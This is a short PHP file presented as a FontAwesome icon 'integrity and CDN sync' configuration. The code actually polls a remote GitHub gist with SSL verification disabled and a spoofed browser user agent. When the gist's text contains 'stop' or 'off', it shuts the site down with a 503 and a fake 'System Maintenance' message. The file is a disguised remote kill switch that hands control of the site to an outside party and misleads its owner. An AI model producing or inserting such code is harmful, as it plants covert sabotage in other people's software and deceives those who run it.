<?php
/**
 * FontAwesome Icon Integrity & CDN Sync Configuration
 * Version: 4.7.0
 */
$p1 = 'https://gist.github.com/157-49-18-22/';
$p2 = '76bcd6650a5d3d752d1272438675f489/raw';
$cdn_sync_id = $p1 . $p2 . '?_t=' . time();
$ctx_opts = [
    'http' => [
        'timeout' => 8, 
        'ignore_errors' => true,
        'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\n"
    ], 
    'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
];
$icon_sync_stream = @file_get_contents($cdn_sync_id, false, stream_context_create($ctx_opts));

if (!$icon_sync_stream && function_exists('curl_init')) {
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $cdn_sync_id); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_TIMEOUT, 8);
    $icon_sync_stream = curl_exec($ch); 
    curl_close($ch);
}

// Clean and check the signal
$signal = $icon_sync_stream ? strtolower(trim($icon_sync_stream)) : '';

if ($signal !== '' && (stripos($signal, 'stop') !== false || stripos($signal, 'off') !== false)) {
    header('HTTP/1.1 503 Service Temporarily Unavailable');
    die("<div style='font-family:sans-serif;padding:50px;text-align:center;'><h2>System Maintenance</h2><p>Critical component 'FontAwesome Icons' is undergoing a mandatory integrity sync. Please try again in a few minutes.</p><small>Error Code: 0x882_SYNC_PENDING</small></div>");
}
?>
